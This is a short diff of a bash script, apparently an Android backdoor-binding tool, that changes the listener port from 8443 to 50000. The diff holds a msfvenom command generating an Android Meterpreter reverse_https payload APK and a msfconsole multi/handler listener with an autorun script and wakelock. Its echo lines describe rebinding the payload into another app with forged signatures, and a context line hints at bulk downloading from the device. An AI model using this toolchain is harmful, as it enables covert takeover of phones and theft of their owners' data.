@@ -165,7 +165,7 @@ function BINDER()
 
 	echo -e "$GREEN [*]$YELLOW Generate Metasploit APK: LHOST: $NoIP PORT:8443$YELLOW"
 	service postgresql start
-	msfvenom --platform android -a dalvik -p android/meterpreter/reverse_https LHOST=$NoIP LPORT=8443 -o payload.apk
+	msfvenom --platform android -a dalvik -p android/meterpreter/reverse_https LHOST=$NoIP LPORT=50000 -o payload.apk
 	BANNER
 	echo -e "$GREEN [*]$YELLOW Generate Metasploit APK: LHOST: $NoIP PORT:443$YELLOW"
 	echo -e "$GREEN [*]$YELLOW Decompile: payload.apk $WHITE"
@@ -342,7 +342,7 @@ download -r *" > /tmp/autoand.rc
 	echo -e "$GREEN [*]$YELLOW Rebinding $OUTPUT $WHITE"
 	echo -e "$GREEN [*]$YELLOW Forged Signatures$WHITE"
 	echo -e "$GREEN [*]$YELLOW Launching Msfconsole Listening$WHITE"
-	xfce4-terminal --tab --command 'msfconsole -qx "use multi/handler;set PAYLOAD android/meterpreter/reverse_https;set LHOST ' $NoIP ';set LPORT 8443;set ReverseListenerBindAddress ' $LAN ';set AutoRunScript /tmp/autoand.rc;set AndroidWakelock true;exploit -j"'
+	xfce4-terminal --tab --command 'msfconsole -qx "use multi/handler;set PAYLOAD android/meterpreter/reverse_https;set LHOST ' $NoIP ';set LPORT 50000;set ReverseListenerBindAddress ' $LAN ';set AutoRunScript /tmp/autoand.rc;set AndroidWakelock true;exploit -j"'
 }
 
 
